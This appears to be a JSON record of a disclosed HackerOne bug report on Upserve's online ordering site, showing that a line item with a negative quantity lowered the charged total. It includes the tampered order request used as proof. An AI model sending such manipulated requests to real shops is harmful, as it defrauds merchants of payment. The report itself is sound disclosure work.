@@ -1,0 +1,165 @@
+{
+  "id": 364843,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQ4NDM=",
+  "url": "https://hackerone.com/reports/364843",
+  "title": "OLO Total price manipulation using negative quantities",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-06-11T22:02:17.892Z",
+  "submitted_at": "2018-06-11T22:02:17.892Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fuzz",
+    "url": "/fuzz",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21981,
+    "url": "https://hackerone.com/upserve",
+    "handle": "upserve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Upserve ",
+      "twitter_handle": "getupserve",
+      "website": "http://upserve.com",
+      "about": "Upserve offers cloud point of sale for restaurants, actionable analytics, payment processing, and mobile restaurant management."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-06T17:59:06.463Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-06-06T17:58:56.753Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.\n\nIn the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).\n\nThe total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.\n\n```json\n{\"card_uuid\": \"09ef096d-18d7-4cb4-83b7-5bd15d310aac\", \"city\": \"Cambridge\", \"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"line1\": \"1230 Massachusetts Ave\", \"order\": {\"charges\": {\"items\": [{\"item_id\": \"254baa85-92c1-412e-a391-aaf44508d882\", \"name\": \"ChickenBurger\", \"price\": 1200, \"quantity\": 2, \"instructions\": \"\", \"total\": 1200, \"modifiers\": [], \"sides\": []}, {\"item_id\": \"9169bfc1-2ee1-455b-ad65-aeadd36f46eb\", \"name\": \"BreadPudding\", \"price\": 900, \"quantity\": -1, \"instructions\": \"\", \"total\": 900, \"modifiers\": [], \"sides\": []}], \"taxes\": 290, \"tip\": {\"amount\": 0}, \"total\": 1870}, \"confirmation_code\": \"upserve-hacker-cafe-32870\", \"fulfillment_info\": {\"customer\": {\"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"phone\": \"555-555-5555\"}, \"delivery_info\": {\"address\": {\"address_line1\": \"1230 Massachusetts Ave\", \"address_line2\": null, \"city\": \"Cambridge\", \"country\": \"\", \"state\": \"MA\", \"zip_code\": \"02138\"}}, \"instructions\": \"\", \"type\": \"delivery\"}, \"id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"payments\": {\"payments\": [{\"amount\": 0, \"payment_type\": \"CREDIT\", \"tip_amount\": 0}], \"total\": 3190}, \"time_placed\": \"2018-06-11T20:48:51.313Z\"}, \"order_total\": 3190, \"phone_number\": \"555-555-5555\", \"state\": \"MA\", \"store_pretty_url\": \"upserve-lounge-test-providence-2\", \"submission_id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"text_alerts\": false, \"zip\": \"02138\"}\n```\n\n## Impact\n\nThe attacker can reduce the price of the order.",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 307763,
+      "file_name": "Screen_Shot_2018-06-11_at_2.36.37_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/307/763/442989a263819ed500aa8c425f830a0034232710/Screen_Shot_2018-06-11_at_2.36.37_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-06-11_at_2.36.37_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-06-11_at_2.36.37_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVCEIVMPZ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T014233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCNN%2FPkWk8ukfPPfsN4x0W4cBZCf1b%2BGRAGKbL4uuJo6gIgAa9w8a71115X%2FDHk%2BsKmNEU7MA2jEcla7P9hFrvt%2FksquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB8vYdxIVaCHHRfd2CqPBeN9wOXfgnyj%2BHIMbNhE7GEOyc0%2Fy89qH1%2F7Bl1dk8DDJfNOMMel%2F2IufpoXrHQO%2FY68QKg7RmtoCKcYFQ1W6xTrLt07gfZansBnhxAA0j9In4GHwr7%2BLsd%2BmZiw1U9giNuvywT%2BFPgMT%2FAOvDeBW6bjL3PSATulxQ9SmmcbTgizq1e7ihsTDe%2Bar%2Fvw3F1hky%2F7QLF2W4xnL5fy4XBl1LSHPPzFT7tqYGW%2F%2BMFsbldzauQSHhpLFyOG3RK8Rkx8OMSRr%2F4EHjRakCRojKQ3w32AL2P%2FI555%2FS%2FKUEZ%2FfbO3uJ0Ddv0PGGNyeZFp41M6X8oWWLwOH8LWriYEob6K%2B5%2BtaHbbYR67djoUF%2Bf8cW2DLd27MaO6rTkn4tiHmjs7ZDC7RQWmP7iDrAGXhdtNHokNspoPTAv295CW7lBO4NZMCwpfpFcnmxkdnDigRuMgNGNoer2ZSezunA25iKmCgR3iGONcRl%2Fn06rGrBCt1DkE42ITp8Pkk5D7Sf8WH89dfl9jkVyZZAyo6zWjq%2BCVuJeHlxHUzrqtgOFLyNp6nzVSjWcvsCLLUpEyZ3FrGtNc%2F1jdGtXikg5dF02Md8KQ5M1qF8ljQLT7y9waSOY%2F0PtCsqlgHqjHh8CrSeruIdITWsPTtLrybom2Afju9%2Fb5LxBQMSGjg%2BS9K7O3016BCCS0NDRh%2BVzOtDhZZQyDd2YBNrInNOcj6pVA89u8pLry%2FQ4p1egjAjH21dHruFo3WPVV1VCyiTKSpyHeKF3csws6XSSCQluK8jkrlHuzaflzFhb20%2B9QW633ZhEfOj86ynFYDmkEtr3VeDfeU9hQXQiGYunyh%2F0miVECGakbXYK2S3l5bpuXWk6O4qydWs27CUwwsN3jzAY6sQGPsyeP6amHCPTKaKVnhvGYhyoaDS2khVqYbLh7gsV0kcqYfCGAEm%2B4bmll3EgfDO2z%2FbcaDqymvJ3p7ombaounjv2QANRIYDpaowt0Ujh2H%2FaI%2FPI9HdoFuzAheveG42Z1KRtSqafE4uAFeH7Hhwy1zYHSO4PkRevclyQwJ4lHXs68PItRVIStfKrVMSFBU3qlQz6qRmO2GdAmoK0kP6NaSS0BLDW0C2pbLTRsGuqRQc0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e570bbc5e69aa9acbbea7c0649967138d57a3894a1e6c4d53bfa126d0ae1ef41",
+      "file_size": 13138,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 307764,
+      "file_name": "Screen_Shot_2018-06-11_at_2.36.48_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/307/764/b0e89b032f9b547fa49cd97e6938e48265cb6083/Screen_Shot_2018-06-11_at_2.36.48_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-06-11_at_2.36.48_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-06-11_at_2.36.48_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVCEIVMPZ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T014233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCNN%2FPkWk8ukfPPfsN4x0W4cBZCf1b%2BGRAGKbL4uuJo6gIgAa9w8a71115X%2FDHk%2BsKmNEU7MA2jEcla7P9hFrvt%2FksquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB8vYdxIVaCHHRfd2CqPBeN9wOXfgnyj%2BHIMbNhE7GEOyc0%2Fy89qH1%2F7Bl1dk8DDJfNOMMel%2F2IufpoXrHQO%2FY68QKg7RmtoCKcYFQ1W6xTrLt07gfZansBnhxAA0j9In4GHwr7%2BLsd%2BmZiw1U9giNuvywT%2BFPgMT%2FAOvDeBW6bjL3PSATulxQ9SmmcbTgizq1e7ihsTDe%2Bar%2Fvw3F1hky%2F7QLF2W4xnL5fy4XBl1LSHPPzFT7tqYGW%2F%2BMFsbldzauQSHhpLFyOG3RK8Rkx8OMSRr%2F4EHjRakCRojKQ3w32AL2P%2FI555%2FS%2FKUEZ%2FfbO3uJ0Ddv0PGGNyeZFp41M6X8oWWLwOH8LWriYEob6K%2B5%2BtaHbbYR67djoUF%2Bf8cW2DLd27MaO6rTkn4tiHmjs7ZDC7RQWmP7iDrAGXhdtNHokNspoPTAv295CW7lBO4NZMCwpfpFcnmxkdnDigRuMgNGNoer2ZSezunA25iKmCgR3iGONcRl%2Fn06rGrBCt1DkE42ITp8Pkk5D7Sf8WH89dfl9jkVyZZAyo6zWjq%2BCVuJeHlxHUzrqtgOFLyNp6nzVSjWcvsCLLUpEyZ3FrGtNc%2F1jdGtXikg5dF02Md8KQ5M1qF8ljQLT7y9waSOY%2F0PtCsqlgHqjHh8CrSeruIdITWsPTtLrybom2Afju9%2Fb5LxBQMSGjg%2BS9K7O3016BCCS0NDRh%2BVzOtDhZZQyDd2YBNrInNOcj6pVA89u8pLry%2FQ4p1egjAjH21dHruFo3WPVV1VCyiTKSpyHeKF3csws6XSSCQluK8jkrlHuzaflzFhb20%2B9QW633ZhEfOj86ynFYDmkEtr3VeDfeU9hQXQiGYunyh%2F0miVECGakbXYK2S3l5bpuXWk6O4qydWs27CUwwsN3jzAY6sQGPsyeP6amHCPTKaKVnhvGYhyoaDS2khVqYbLh7gsV0kcqYfCGAEm%2B4bmll3EgfDO2z%2FbcaDqymvJ3p7ombaounjv2QANRIYDpaowt0Ujh2H%2FaI%2FPI9HdoFuzAheveG42Z1KRtSqafE4uAFeH7Hhwy1zYHSO4PkRevclyQwJ4lHXs68PItRVIStfKrVMSFBU3qlQz6qRmO2GdAmoK0kP6NaSS0BLDW0C2pbLTRsGuqRQc0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04765bd8885f79a9dd23622112a8289f5c535a7cf8285af2b0a8f360d42ae5ae",
+      "file_size": 43186,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-07-06T17:58:56.937Z",
+  "allow_singular_disclosure_after": -209202216.22691295,
+  "singular_disclosure_allowed": true,
+  "vote_count": 162,
+  "voters": [
+    "hellnia",
+    "ezzra",
+    "loaymorad",
+    "gregxsunday",
+    "wargsec",
+    "aboalezz",
+    "p1stachios",
+    "k4k4r07",
+    "base_64",
+    "7odamoo",
+    "and 152 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 9988,
+    "asset_type": "URL",
+    "asset_identifier": "orders.upserve.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "id": 16536,
+      "category": "team",
+      "content": "The total amount of an order could be modified by including an item with a negative quantity.",
+      "updated_at": "2019-06-06T17:58:48.715Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 177914,
+        "username": "upserve-bryan",
+        "name": "Bryan Brannigan",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://upserve.com",
+        "location": "",
+        "created_at": "2017-06-23T12:52:45.774Z",
+        "url": "https://hackerone.com/upserve-bryan",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
